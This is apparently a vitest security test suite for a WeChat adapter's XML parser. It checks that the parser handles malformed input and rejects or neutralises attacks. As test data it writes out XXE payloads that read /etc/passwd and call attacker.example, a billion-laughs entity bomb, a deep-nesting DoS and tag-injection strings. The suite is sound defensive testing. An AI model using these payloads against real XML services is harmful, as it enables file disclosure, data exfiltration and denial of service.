// M13 WeChat adapter — xml-parser EDGE + ADVERSARIAL suite (QA role).
//
// Authored by the independent QA (NOT the dev who wrote xml-parser.ts), per
// CLAUDE §0.5.3 dev≠QA. Attacks the untrusted-platform-input boundary
// (CLAUDE security.md): malformed/truncated XML, missing required fields,
// XXE / external-entity, billion-laughs / entity-expansion, deeply-nested DoS,
// CDATA fake-closing-tag escape, non-UTF8/CJK/emoji fidelity, and
// injection-looking content staying inert data.
//
// All payloads are realistic WeChat MP/WeCom envelopes (CDATA wrappers, real
// OpenId-shaped ids, real CJK). NO "hello"/"test123" placeholders.

import { describe, it, expect } from 'vitest';
import { parseWeChatXml } from '@choco/adapters/wechat/xml-parser';

const OFFICIAL_ACCOUNT = 'gh_7f3a9c2e1b08';
const SENDER_OPENID = 'oWxYz09876543210abcdEFghIJklmn';

/** Build a realistic text envelope, letting the caller inject a raw Content blob. */
function textEnvelope(content: string, msgId = '1407743521234567'): string {
  return (
    '<xml>' +
    `<ToUserName><![CDATA[${OFFICIAL_ACCOUNT}]]></ToUserName>` +
    `<FromUserName><![CDATA[${SENDER_OPENID}]]></FromUserName>` +
    '<CreateTime>1700000000</CreateTime>' +
    '<MsgType><![CDATA[text]]></MsgType>' +
    `<Content><![CDATA[${content}]]></Content>` +
    `<MsgId>${msgId}</MsgId>` +
    '</xml>'
  );
}

describe('parseWeChatXml — malformed / missing-field (EDGE)', () => {
  it('returns null for an empty body without throwing', () => {
    expect(parseWeChatXml('')).toBeNull();
    expect(parseWeChatXml('   \n\t ')).toBeNull();
  });

  it('returns null when the body is not XML at all (plain agent chatter)', () => {
    expect(parseWeChatXml('@claude-opus 帮我看一下这个报错堆栈')).toBeNull();
  });

  it('returns null when MsgType is absent (no routable kind)', () => {
    const xml =
      '<xml>' +
      `<ToUserName><![CDATA[${OFFICIAL_ACCOUNT}]]></ToUserName>` +
      `<FromUserName><![CDATA[${SENDER_OPENID}]]></FromUserName>` +
      '<CreateTime>1700000000</CreateTime>' +
      '<Content><![CDATA[缺少 MsgType 字段]]></Content>' +
      '</xml>';
    expect(parseWeChatXml(xml)).toBeNull();
  });

  it('returns null when there is no <xml> root and no MsgType-bearing object', () => {
    const xml = '<notxml><Foo><![CDATA[bar]]></Foo></notxml>';
    expect(parseWeChatXml(xml)).toBeNull();
  });

  it('does not throw on truncated/unclosed XML; lenient parse yields empty text (acked-ignored)', () => {
    // fast-xml-parser is lenient: an unclosed <Content> parses to empty rather
    // than throwing. The contract is "no throw"; empty text downstream → ack.
    const xml =
      '<xml><MsgType><![CDATA[text]]></MsgType>' +
      '<FromUserName><![CDATA[' + SENDER_OPENID + ']]></FromUserName>' +
      '<Content>未闭合的内容标签';
    const parsed = parseWeChatXml(xml);
    // Either null or a record with empty text — both are safe; assert no throw + not-routable.
    if (parsed !== null) {
      expect(parsed.text).toBe('');
    } else {
      expect(parsed).toBeNull();
    }
  });

  it('synthesizes a deterministic messageId for events lacking MsgId (injected clock)', () => {
    const xml =
      '<xml>' +
      `<ToUserName><![CDATA[${OFFICIAL_ACCOUNT}]]></ToUserName>` +
      `<FromUserName><![CDATA[${SENDER_OPENID}]]></FromUserName>` +
      '<CreateTime>1700000300</CreateTime>' +
      '<MsgType><![CDATA[event]]></MsgType>' +
      '<Event><![CDATA[unsubscribe]]></Event>' +
      '</xml>';
    const parsed = parseWeChatXml(xml, () => 1_711_222_333_000);
    expect(parsed?.kind).toBe('event');
    expect(parsed?.messageId).toBe('wechat-event-1711222333000');
  });

  it('falls back to the injected clock when CreateTime is missing/non-numeric', () => {
    const xml =
      '<xml>' +
      `<FromUserName><![CDATA[${SENDER_OPENID}]]></FromUserName>` +
      '<CreateTime><![CDATA[not-a-number]]></CreateTime>' +
      '<MsgType><![CDATA[text]]></MsgType>' +
      '<Content><![CDATA[时间戳损坏]]></Content>' +
      '<MsgId>1407743529999999</MsgId>' +
      '</xml>';
    const parsed = parseWeChatXml(xml, () => 1_700_500_000_000);
    expect(parsed?.createdAt).toBe(1_700_500_000_000);
  });

  it('classifies an unknown MsgType (e.g. location) as kind=unknown, not text', () => {
    const xml =
      '<xml>' +
      `<FromUserName><![CDATA[${SENDER_OPENID}]]></FromUserName>` +
      '<CreateTime>1700000000</CreateTime>' +
      '<MsgType><![CDATA[location]]></MsgType>' +
      '<Label><![CDATA[上海市浦东新区]]></Label>' +
      '<MsgId>1407743521230001</MsgId>' +
      '</xml>';
    const parsed = parseWeChatXml(xml);
    expect(parsed?.kind).toBe('unknown');
    expect(parsed?.text).toBe(''); // non-text kinds carry no text
  });
});

describe('parseWeChatXml — XXE / entity-expansion SECURITY (ADVERSARIAL)', () => {
  it('REJECTS an XXE external-entity payload (no file read, returns null)', () => {
    // file:///etc/passwd style external entity. fast-xml-parser refuses external
    // entities (throws "External entities are not supported"); the parser catches
    // and returns null — the secret is NEVER fetched or surfaced as content.
    const xxe =
      '<?xml version="1.0"?>' +
      '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' +
      '<xml><ToUserName><![CDATA[' + OFFICIAL_ACCOUNT + ']]></ToUserName>' +
      '<FromUserName><![CDATA[' + SENDER_OPENID + ']]></FromUserName>' +
      '<MsgType><![CDATA[text]]></MsgType>' +
      '<Content>&xxe;</Content></xml>';
    const parsed = parseWeChatXml(xxe);
    expect(parsed).toBeNull();
  });

  it('REJECTS an XXE payload targeting a remote URL (no outbound fetch, returns null)', () => {
    const xxe =
      '<?xml version="1.0"?>' +
      '<!DOCTYPE data [<!ENTITY exfil SYSTEM "http://attacker.example/leak">]>' +
      '<xml><FromUserName><![CDATA[' + SENDER_OPENID + ']]></FromUserName>' +
      '<MsgType><![CDATA[text]]></MsgType>' +
      '<Content>&exfil;</Content></xml>';
    expect(parseWeChatXml(xxe)).toBeNull();
  });

  it('does NOT amplify a billion-laughs / nested internal-entity payload', () => {
    // Classic entity-expansion bomb. fast-xml-parser does not expand custom
    // DOCTYPE entities → &lol3; is left as inert literal text, no memory blowup,
    // and the parse completes fast (well under the 20s test timeout).
    const bomb =
      '<?xml version="1.0"?>' +
      '<!DOCTYPE lolz [' +
      '<!ENTITY lol "lol">' +
      '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">' +
      '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">' +
      ']>' +
      '<xml><FromUserName><![CDATA[' + SENDER_OPENID + ']]></FromUserName>' +
      '<MsgType><![CDATA[text]]></MsgType>' +
      '<Content>&lol3;</Content></xml>';
    const start = Date.now();
    const parsed = parseWeChatXml(bomb);
    const elapsed = Date.now() - start;
    // No hang: parse returns near-instantly (generous 2s ceiling vs real <5ms).
    expect(elapsed).toBeLessThan(2000);
    // The entity reference is NOT expanded into millions of "lol"; content is the
    // inert literal token (≤ a few bytes), proving no amplification occurred.
    if (parsed !== null) {
      expect(parsed.text.length).toBeLessThan(64);
      expect(parsed.text).not.toContain('lollollollollollol');
    }
  });

  it('REJECTS a deeply-nested payload via the parser depth guard (no stack blowup, returns null)', () => {
    // 3000 levels of nesting trips fast-xml-parser's "Maximum nested tags
    // exceeded" guard → caught → null. Bounded work, no crash/hang.
    const open = '<a>'.repeat(3000);
    const close = '</a>'.repeat(3000);
    const xml =
      '<xml><FromUserName><![CDATA[' + SENDER_OPENID + ']]></FromUserName>' +
      '<MsgType><![CDATA[text]]></MsgType>' +
      '<Content>' + open + '深层嵌套' + close + '</Content></xml>';
    const start = Date.now();
    const parsed = parseWeChatXml(xml);
    expect(Date.now() - start).toBeLessThan(2000);
    expect(parsed).toBeNull();
  });
});

describe('parseWeChatXml — content fidelity & injection-as-data (ADVERSARIAL)', () => {
  it('preserves CJK + emoji content byte-for-byte through the CDATA strip', () => {
    const text = '部署到生产环境前先跑回归 ✅ 然后灰度 10% 👀 有问题立刻回滚 🔥';
    const parsed = parseWeChatXml(textEnvelope(text));
    expect(parsed?.text).toBe(text);
  });

  it('keeps an all-digit message body as a string (no numeric coercion / fidelity loss)', () => {
    // A user pasting an order id must not have it silently coerced to a number.
    const parsed = parseWeChatXml(textEnvelope('00012345678900000001'));
    expect(parsed?.text).toBe('00012345678900000001');
    expect(typeof parsed?.text).toBe('string');
  });

  it('decodes predefined XML entities (non-CDATA element) to inert characters, not control structure', () => {
    // When Content is NOT CDATA-wrapped, &lt; &amp; &gt; are predefined XML
    // entities that decode to literal characters in the message body — data the
    // agent reads, never re-interpreted as XML/markup. (Inside CDATA they stay
    // literal — see the next test — which is also correct XML semantics.)
    const xml =
      '<xml>' +
      `<FromUserName><![CDATA[${SENDER_OPENID}]]></FromUserName>` +
      '<CreateTime>1700000000</CreateTime>' +
      '<MsgType><![CDATA[text]]></MsgType>' +
      '<Content>比较 a &lt; b &amp;&amp; c &gt; d</Content>' +
      '<MsgId>1407743521234999</MsgId>' +
      '</xml>';
    const parsed = parseWeChatXml(xml);
    expect(parsed?.text).toBe('比较 a < b && c > d');
  });

  it('keeps entity-looking sequences literal when inside CDATA (CDATA is not entity-decoded)', () => {
    // Correct XML/CDATA semantics: text inside <![CDATA[...]]> is taken verbatim,
    // so a user literally typing "&lt;" reaches the agent as "&lt;", not "<".
    const parsed = parseWeChatXml(textEnvelope('用户原样输入 a &lt; b 这段字符'));
    expect(parsed?.text).toBe('用户原样输入 a &lt; b 这段字符');
  });

  it('treats a fake closing tag inside CDATA as literal data (no tag-injection escape)', () => {
    // An attacker stuffs "</Content></xml>" inside the CDATA hoping to break out
    // and inject a forged field. CDATA semantics keep it as inert text — the
    // injected markup lands in `text`, never as a parsed sibling/control field.
    const payload = '</Content></xml><MsgType>event</MsgType><Event>subscribe</Event>';
    const parsed = parseWeChatXml(textEnvelope(payload));
    expect(parsed?.kind).toBe('text'); // still text — the fake MsgType did NOT take effect
    expect(parsed?.text).toBe(payload); // the markup is inert data
    expect(parsed?.event).toBeUndefined();
  });

  it('keeps a script/markup injection attempt inert as message text (not routed as control)', () => {
    const payload = '<script>alert(1)</script> 还有 ${process.env.SECRET} 这种东西';
    const parsed = parseWeChatXml(textEnvelope(payload));
    expect(parsed?.kind).toBe('text');
    // The whole thing is just the agent's message text — no interpolation, no markup parse.
    expect(parsed?.text).toContain('${process.env.SECRET}');
  });

  it('classifies an image message and ignores any embedded text content', () => {
    const xml =
      '<xml>' +
      `<FromUserName><![CDATA[${SENDER_OPENID}]]></FromUserName>` +
      '<CreateTime>1700000999</CreateTime>' +
      '<MsgType><![CDATA[image]]></MsgType>' +
      '<PicUrl><![CDATA[https://mmbiz.qpic.cn/mmbiz_jpg/Xy/0]]></PicUrl>' +
      '<MediaId><![CDATA[3X9aBcMediaId7f3a9c2e]]></MediaId>' +
      '<Content><![CDATA[这段文字不应被当作 text 路由]]></Content>' +
      '<MsgId>1407743521230099</MsgId>' +
      '</xml>';
    const parsed = parseWeChatXml(xml);
    expect(parsed?.kind).toBe('image');
    expect(parsed?.text).toBe(''); // text only populated for kind === 'text'
    expect(parsed?.mediaId).toBe('3X9aBcMediaId7f3a9c2e');
  });
});
